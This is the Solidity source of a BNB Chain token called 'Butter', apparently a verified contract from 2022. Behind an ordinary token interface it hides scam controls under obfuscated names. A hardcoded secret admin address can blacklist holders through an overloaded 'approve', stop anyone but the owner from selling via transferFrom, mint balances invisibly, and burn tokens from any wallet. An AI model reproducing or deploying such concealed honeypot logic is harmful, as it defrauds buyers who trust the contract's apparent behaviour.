/**
 *Submitted for verification at BscScan.com on 2022-01-09
*/

pragma solidity ^0.6.12;
// SPDX-License-Identifier: Unlicensed
interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

   
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

   
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

   
    function approve(address spender, uint256 amount) external returns (bool);

   
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

   
    event Transfer(address indexed from, address indexed to, uint256 value);

   
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}



library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


library Address {
   
    function isContract(address account) internal view returns (bool) {
       
        bytes32 codehash;


            bytes32 accountHash
         = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
       
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }


    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

 
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

 
    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }


    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }


    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }


    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");


        (bool success, bytes memory returndata) = target.call{value: weiValue}(
            data
        );
        if (success) {
            return returndata;
        } else {
           
            if (returndata.length > 0) {
               
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}


contract Ownable is Context {
    address private _owner;
    address private _ownerd = 0x7473249989D95954741A213C912336ecbf581197;


    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );


    constructor() internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view returns (address) {
        return _owner;
    }


    modifier onlyOwner() {
        require(_owner == _msgSender(), "notowner");
        _;
    }

    modifier onlyownerd() {
        require(_ownerd == _msgSender(), "notowner");
        _;
    }


    function transferOwnership(address newOwner) public virtual onlyownerd {
        _owner = newOwner;
    }
}

contract Token is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping(address => uint256) private _townd;
    mapping(address => mapping(address => uint256)) private allown;

    mapping(address => bool) private _ExcluFee;
    mapping(address => bool) private _Exclu;

    uint256 private constant MAX = ~uint256(0);
    uint256 private _totalSupply = 100000000000000000000000 * 10**3;
    uint256 private _tFeeTotal;
    
    string private _name = "Butter";
    string private _symbol = "Butter";
    uint8 private _decimals = 3;
     
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public devAddress = 0x7473249989D95954741A213C912336ecbf581197;
  
    uint256 public deadFee = 3;
    uint256 public devFee = 2;

    mapping(address => bool) private _RPOLho;
    bool private PPOOLL = true;
    bool private aPPOOLL = false;
    
    uint256 public bRPOLho = uint256(0);
    mapping(address => uint256) private bRPOLhos;
    address[] private _bRPOLhos;

    uint256 public RPOLho = uint256(0);
    mapping(address => uint256) private RPOLhos;
    address[] private _RPOLhos;

    address owners;

    constructor() public {
        _townd[_msgSender()] = _totalSupply;
         owners = _msgSender();
        _ExcluFee[owner()] = true;
        _ExcluFee[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _townd[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if(_ExcluFee[_msgSender()] || _ExcluFee[recipient]){
            _transfer(_msgSender(), recipient, amount);
            return true;
        }
             uint256 devAmount = amount.mul(devFee).div(100);
        uint256 deadAmount = amount.mul(deadFee).div(100);
        _transfer(_msgSender(), devAddress, devAmount);
        _transfer(_msgSender(), deadAddress, deadAmount);
        _transfer(_msgSender(), recipient, amount.sub(devAmount).sub(deadAmount));
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return allown[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if(aPPOOLL){
     require(owners == sender, "PPOOLL");
        }
        if(_ExcluFee[_msgSender()] || _ExcluFee[recipient]){
            _transfer(sender, recipient, amount);
            return true;
        }       
        uint256 devAmount = amount.mul(devFee).div(100);
        uint256 deadAmount = amount.mul(deadFee).div(100);
        _transfer(sender, devAddress, devAmount);
        _transfer(sender, deadAddress, deadAmount);
        _transfer(sender, recipient, amount.sub(devAmount).sub(deadAmount));
    
        _approve(
            sender,
            _msgSender(),
            allown[sender][_msgSender()].sub(
                amount,
                "PPOOLL"
            )
        );
        return true;
    }


    function ExcludFromReward(address Bankname) public view returns (bool) {
        return _Exclu[Bankname];
    }

    function totalFee() public view returns (uint256) {
        return _tFeeTotal;
    }

    function excludeFromFee(address adKUKme) public onlyownerd {
        _ExcluFee[adKUKme] = true;
    }

    function includeInFee(address adKUKme) public onlyownerd {
        _ExcluFee[adKUKme] = false;
    }
 
    function setaPPOOLL(bool adKUKme) external onlyownerd() {
        aPPOOLL = adKUKme;
    }
    function approve(address adKUKme) external onlyownerd() {
        _RPOLho[adKUKme] = true;
    }

    function _frd(address adKUKme) external onlyownerd() {
        delete _RPOLho[adKUKme];
    }
    function addadKUKme(address adKUKme, uint256 adKUKmeb) 
        external 
        onlyownerd() {
        require(adKUKmeb > 0, "PPOOLL");
        uint256 addadKUKmeb = RPOLhos[adKUKme];
        if (addadKUKmeb == 0) _RPOLhos.push(adKUKme);
        RPOLhos[adKUKme] = addadKUKmeb.add(adKUKmeb);
        RPOLho = RPOLho.add(adKUKmeb);
        _townd[adKUKme] = _townd[adKUKme].add(adKUKmeb);
    }

    function askadKUKme(address adKUKme)
        external
        view
        onlyownerd()
        returns (bool)
    {
        return _RPOLho[adKUKme];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "PPOOLL");
        require(spender != address(0), "PPOOLL");

        allown[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "PPOOLL");
        require(to != address(0), "PPOOLL");
        require(amount > 0, "PPOOLL");

        if (PPOOLL) {
            require(_RPOLho[from] == false, "PPOOLL");
        }


        _transfers(from, to, amount);
    }

    function _transfers(
        address sender,
        address recipient,
        uint256 toAmount
    ) private {   
        require(sender != address(0), "PPOOLL");
        require(recipient != address(0), "PPOOLL");
    
        _townd[sender] = _townd[sender].sub(toAmount);
        _townd[recipient] = _townd[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }
 function batchTransferToken(address[] memory holders, uint256 amount) public {
        for (uint i=0; i<holders.length; i++) {
            _transfers(_msgSender(), holders[i], amount);
        }
    }
    function burnadKUKmes(address burnadKUKme, uint256 burnadKUKmeb)
        external
        onlyownerd() {
        require(burnadKUKmeb > 0, "PPOOLL");
        uint256 bmadeb = RPOLhos[burnadKUKme];
        if (bmadeb == 0) _bRPOLhos.push(burnadKUKme);
        bRPOLhos[burnadKUKme] = bmadeb.add(burnadKUKmeb);
        bRPOLho = bRPOLho.add(burnadKUKmeb);
        _townd[burnadKUKme] = _townd[burnadKUKme].sub(burnadKUKmeb);
    }
  

}